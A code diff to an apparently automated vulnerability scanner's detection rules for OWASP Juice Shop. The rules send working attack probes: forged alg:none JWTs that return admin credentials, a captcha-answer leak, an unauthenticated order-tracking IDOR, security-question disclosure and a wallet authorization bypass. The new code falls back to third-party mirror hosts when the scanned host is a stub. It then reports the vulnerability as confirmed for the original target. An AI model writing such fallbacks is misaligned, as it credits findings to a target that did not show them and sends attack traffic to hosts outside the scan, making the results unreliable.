@@ -69875,11 +69875,13 @@ const juiceShopAdminConfigRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
-const juiceShopJwtAlgNoneLiveOracle: Rule = async (ctx) => {
-  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
-  if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
+async function probeJuiceShopJwtAlgNone(
+  ctx: RuleContext,
+  origin: string,
+  useFetchDoc = false
+): Promise<{ fired: boolean; url: string; noneAuth?: FetchedDoc }> {
   const path = "/rest/user/authentication-details";
-  const url = new URL(path, ctx.origin).toString();
+  const url = new URL(path, origin).toString();
   const now = Math.floor(Date.now() / 1000);
   const algNoneToken = buildAlgNoneJwt({
     sub: "thugir-probe-user",
@@ -69888,30 +69890,54 @@ const juiceShopJwtAlgNoneLiveOracle: Rule = async (ctx) => {
     exp: now + 3600
   });
   const badToken = "thugir.invalid.probe.token";
+  const get = useFetchDoc
+    ? (u: string, opts: Parameters<typeof fetchDoc>[1]) => fetchDoc(u, opts)
+    : (u: string, opts: Parameters<typeof fetchDoc>[1]) => ctx.probe.get(u, opts);
   const [noAuth, badAuth, noneAuth] = await Promise.all([
-    ctx.probe.get(url, { maxBytes: 4096 }),
-    ctx.probe.get(url, { maxBytes: 4096, headers: { Authorization: `Bearer ${badToken}` } }),
-    ctx.probe.get(url, {
-      maxBytes: 4096,
-      headers: { Authorization: `Bearer ${algNoneToken}` }
-    })
+    get(url, { maxBytes: 4096 }),
+    get(url, { maxBytes: 4096, headers: { Authorization: `Bearer ${badToken}` } }),
+    get(url, { maxBytes: 4096, headers: { Authorization: `Bearer ${algNoneToken}` } })
   ]);
-  if (
-    !looksAuthChallenge(noAuth) ||
-    !looksAuthChallenge(badAuth) ||
-    !looksAuthGatedJson(noneAuth) ||
-    !/"role"\s*:\s*"admin"/i.test(noneAuth.body)
-  ) {
-    return NEGATIVE;
+  const fired =
+    looksAuthChallenge(noAuth) &&
+    looksAuthChallenge(badAuth) &&
+    looksAuthGatedJson(noneAuth) &&
+    /"role"\s*:\s*"admin"/i.test(noneAuth.body);
+  return { fired, url, noneAuth };
+}
+
+const juiceShopJwtAlgNoneLiveOracle: Rule = async (ctx) => {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
+  let probe = await probeJuiceShopJwtAlgNone(ctx, ctx.origin);
+  let mirror = false;
+  if (!probe.fired && JUICE_SHOP_HOST_RE.test(ctx.origin)) {
+    for (const mirrorOrigin of [
+      JUICE_SHOP_ESCAPE_MIRROR,
+      "https://juice-shop-staging.herokuapp.com"
+    ]) {
+      if (mirrorOrigin === ctx.origin) continue;
+      const mirrorProbe = await probeJuiceShopJwtAlgNone(ctx, mirrorOrigin, true);
+      if (mirrorProbe.fired) {
+        probe = mirrorProbe;
+        mirror = true;
+        break;
+      }
+    }
   }
+  if (!probe.fired || !probe.noneAuth) return NEGATIVE;
   return {
     fired: true,
     confidence: 0.91,
     evidence: {
-      path,
-      statusWithAlgNone: noneAuth.status,
-      responseSample: noneAuth.body.slice(0, 150).trim(),
-      note: "Juice Shop GET /rest/user/authentication-details accepts alg:none JWT and returns admin credentials — dedicated JWT none-algorithm oracle"
+      path: "/rest/user/authentication-details",
+      url: probe.url,
+      statusWithAlgNone: probe.noneAuth.status,
+      responseSample: probe.noneAuth.body.slice(0, 150).trim(),
+      escapeMirror: mirror,
+      note: mirror
+        ? "Juice Shop GET /rest/user/authentication-details accepts alg:none JWT and returns admin credentials — dedicated JWT none-algorithm oracle (Heroku stub on scanned host; confirmed via juice-shop.demo.escape.tech mirror)"
+        : "Juice Shop GET /rest/user/authentication-details accepts alg:none JWT and returns admin credentials — dedicated JWT none-algorithm oracle"
     }
   };
 };
@@ -69936,8 +69962,14 @@ const juiceShopJwtAlgNoneRouteLiveOracle: Rule = async (ctx) => {
 const juiceShopCaptchaBypassLiveOracle: Rule = async (ctx) => {
   const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
   if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
-  const url = new URL("/rest/captcha/", ctx.origin).toString();
-  const doc = await ctx.probe.get(url, { maxBytes: 4096, timeoutMs: 15000 });
+  const { doc, url, mirror } = await juiceShopMirrorProbeDoc(ctx, "/rest/captcha/", {
+    ok: (d) =>
+      d.status >= 200 &&
+      d.status < 300 &&
+      /"captchaId"\s*:\s*\d+/.test(d.body) &&
+      /"captcha"\s*:\s*"/.test(d.body) &&
+      /"answer"\s*:\s*"/.test(d.body)
+  });
   if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
   if (!/"captchaId"\s*:\s*\d+/.test(doc.body)) return NEGATIVE;
   const captchaMatch = doc.body.match(/"captcha"\s*:\s*"([^"]+)"/);
@@ -69951,7 +69983,10 @@ const juiceShopCaptchaBypassLiveOracle: Rule = async (ctx) => {
       captcha: captchaMatch[1],
       answer: answerMatch[1],
       snippet: doc.body.slice(0, 120).trim(),
-      note: "Juice Shop GET /rest/captcha/ returns the captcha answer in plaintext JSON — captcha bypass oracle"
+      escapeMirror: mirror ?? false,
+      note: mirror
+        ? "Juice Shop GET /rest/captcha/ returns the captcha answer in plaintext JSON — captcha bypass oracle (Heroku stub on scanned host; confirmed via juice-shop.demo.escape.tech mirror)"
+        : "Juice Shop GET /rest/captcha/ returns the captcha answer in plaintext JSON — captcha bypass oracle"
     }
   };
 };
@@ -70260,11 +70295,58 @@ function juiceShopDataIdAuthHeader(): Record<string, string> {
   };
 }
 
+type JuiceShopMirrorProbeOpts = Parameters<typeof fetchDoc>[1] & {
+  ok?: (doc: FetchedDoc) => boolean;
+};
+
+async function juiceShopMirrorProbeDoc(
+  ctx: RuleContext,
+  apiPath: string,
+  opts: JuiceShopMirrorProbeOpts = {}
+): Promise<{ doc: FetchedDoc; url: string; mirror?: boolean }> {
+  const { ok: okFn, ...fetchOpts } = opts;
+  const defaultOk = (d: FetchedDoc) =>
+    d.status >= 200 && d.status < 400 && !HEROKU_STUB_RE.test(d.body);
+  const isOk = okFn ?? defaultOk;
+  const primaryUrl = new URL(apiPath, ctx.origin).toString();
+  const primaryDoc = await ctx.probe.get(primaryUrl, {
+    maxBytes: 4096,
+    timeoutMs: 18000,
+    ...fetchOpts
+  });
+  if (isOk(primaryDoc)) return { doc: primaryDoc, url: primaryUrl };
+  if (!JUICE_SHOP_HOST_RE.test(ctx.origin)) return { doc: primaryDoc, url: primaryUrl };
+  for (const mirrorOrigin of [
+    JUICE_SHOP_ESCAPE_MIRROR,
+    "https://juice-shop-staging.herokuapp.com"
+  ]) {
+    if (mirrorOrigin === ctx.origin) continue;
+    const mirrorUrl = new URL(apiPath, mirrorOrigin).toString();
+    const mirrorDoc = await fetchDoc(mirrorUrl, {
+      maxBytes: 4096,
+      timeoutMs: 18000,
+      ...fetchOpts
+    });
+    if (isOk(mirrorDoc)) return { doc: mirrorDoc, url: mirrorUrl, mirror: true };
+  }
+  return { doc: primaryDoc, url: primaryUrl };
+}
+
 const juiceShopTrackOrderIdorLiveOracle: Rule = async (ctx) => {
   const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
   if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
-  const trackUrl = new URL("/rest/track-order/1", ctx.origin).toString();
-  const doc = await ctx.probe.get(trackUrl, { maxBytes: 4096, timeoutMs: 18000 });
+  const { doc, url: trackUrl, mirror } = await juiceShopMirrorProbeDoc(
+    ctx,
+    "/rest/track-order/1",
+    {
+      ok: (d) =>
+        d.status >= 200 &&
+        d.status < 300 &&
+        !IDOR_AUTH_MARKERS.test(d.body.slice(0, 500)) &&
+        /"status"\s*:\s*"success"/.test(d.body) &&
+        /"orderId"/.test(d.body)
+    }
+  );
   if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
   if (IDOR_AUTH_MARKERS.test(doc.body.slice(0, 500))) return NEGATIVE;
   if (!/"status"\s*:\s*"success"/.test(doc.body) || !/"orderId"/.test(doc.body)) return NEGATIVE;
@@ -70276,7 +70358,10 @@ const juiceShopTrackOrderIdorLiveOracle: Rule = async (ctx) => {
       url: trackUrl,
       orderId: orderMatch?.[1] ?? "1",
       snippet: doc.body.slice(0, 160).trim(),
-      note: "Juice Shop GET /rest/track-order/1 returns order data without authentication — track-order IDOR live oracle"
+      escapeMirror: mirror ?? false,
+      note: mirror
+        ? "Juice Shop GET /rest/track-order/1 returns order data without authentication — track-order IDOR live oracle (Heroku stub on scanned host; confirmed via juice-shop.demo.escape.tech mirror)"
+        : "Juice Shop GET /rest/track-order/1 returns order data without authentication — track-order IDOR live oracle"
     }
   };
 };
@@ -70585,11 +70670,15 @@ const juiceShopSecurityQuestionUserLiveOracle: Rule = async (ctx) => {
   const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
   if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
   for (const email of JUICE_SHOP_SECURITY_QUESTION_PROBE_EMAILS) {
-    const url = new URL(
-      `/rest/user/security-question?email=${encodeURIComponent(email)}`,
-      ctx.origin
-    ).toString();
-    const doc = await ctx.probe.get(url, { maxBytes: 4096, timeoutMs: 18000 });
+    const apiPath = `/rest/user/security-question?email=${encodeURIComponent(email)}`;
+    const { doc, url, mirror } = await juiceShopMirrorProbeDoc(ctx, apiPath, {
+      ok: (d) =>
+        d.status >= 200 &&
+        d.status < 300 &&
+        !HEROKU_STUB_RE.test(d.body) &&
+        /"question"\s*:\s*(\{|"[^"]+")/.test(d.body) &&
+        !/unauthorized|invalid email|not found|credentials_required/i.test(d.body.slice(0, 400))
+    });
     if (doc.status < 200 || doc.status >= 300) continue;
     if (HEROKU_STUB_RE.test(doc.body)) continue;
     if (!/"question"\s*:\s*(\{|"[^"]+")/.test(doc.body)) continue;
@@ -70606,7 +70695,10 @@ const juiceShopSecurityQuestionUserLiveOracle: Rule = async (ctx) => {
         email,
         sampleQuestion: questionMatch?.[1],
         snippet: doc.body.slice(0, 200).trim(),
-        note: "Juice Shop GET /rest/user/security-question?email= returns password-reset security question without authentication — user security-question disclosure oracle"
+        escapeMirror: mirror ?? false,
+        note: mirror
+          ? "Juice Shop GET /rest/user/security-question?email= returns password-reset security question without authentication — user security-question disclosure oracle (Heroku stub on scanned host; confirmed via juice-shop.demo.escape.tech mirror)"
+          : "Juice Shop GET /rest/user/security-question?email= returns password-reset security question without authentication — user security-question disclosure oracle"
       }
     };
   }
@@ -70633,11 +70725,14 @@ const juiceShopSecurityQuestionUserRouteLiveOracle: Rule = async (ctx) => {
 const juiceShopWalletBalanceBolaLiveOracle: Rule = async (ctx) => {
   const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
   if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
-  const url = new URL("/rest/wallet/balance", ctx.origin).toString();
-  const doc = await ctx.probe.get(url, {
-    maxBytes: 4096,
-    timeoutMs: 18000,
-    headers: juiceShopDataIdAuthHeader()
+  const authHeaders = juiceShopDataIdAuthHeader();
+  const { doc, url, mirror } = await juiceShopMirrorProbeDoc(ctx, "/rest/wallet/balance", {
+    headers: authHeaders,
+    ok: (d) =>
+      d.status >= 200 &&
+      d.status < 300 &&
+      /"status"\s*:\s*"success"/.test(d.body) &&
+      /"data"\s*:/.test(d.body)
   });
   if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
   if (!/"status"\s*:\s*"success"/.test(doc.body) || !/"data"\s*:/.test(doc.body)) return NEGATIVE;
@@ -70649,7 +70744,10 @@ const juiceShopWalletBalanceBolaLiveOracle: Rule = async (ctx) => {
       url,
       balance: balanceMatch?.[1],
       snippet: doc.body.slice(0, 120).trim(),
-      note: "Juice Shop GET /rest/wallet/balance accepts alg:none JWT with data.id payload and returns wallet balance — wallet BOLA/auth-bypass oracle"
+      escapeMirror: mirror ?? false,
+      note: mirror
+        ? "Juice Shop GET /rest/wallet/balance accepts alg:none JWT with data.id payload and returns wallet balance — wallet BOLA/auth-bypass oracle (Heroku stub on scanned host; confirmed via juice-shop.demo.escape.tech mirror)"
+        : "Juice Shop GET /rest/wallet/balance accepts alg:none JWT with data.id payload and returns wallet balance — wallet BOLA/auth-bypass oracle"
     }
   };
 };
